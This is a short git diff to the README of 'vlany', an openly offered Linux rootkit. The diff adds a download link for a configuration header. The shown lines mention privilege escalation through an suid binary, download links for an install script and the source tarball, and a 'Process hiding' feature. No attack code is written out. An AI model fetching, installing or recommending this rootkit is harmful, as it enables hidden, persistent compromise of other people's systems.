@@ -22,7 +22,7 @@ Regular tui installation on a Debian 8 box using an suid binary to escalate priv
 ## Downloads
 [quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh)</br>
 [vlany.tar.gz](https://github.com/mempodippy/vlany/archive/master.tar.gz)</br>
-
+[populated const.h](https://raw.githubusercontent.com/mempodippy/vlany/master/symbols/headers/const.h) (after config.py execution)</br>
 
 ## Features
   * Process hiding
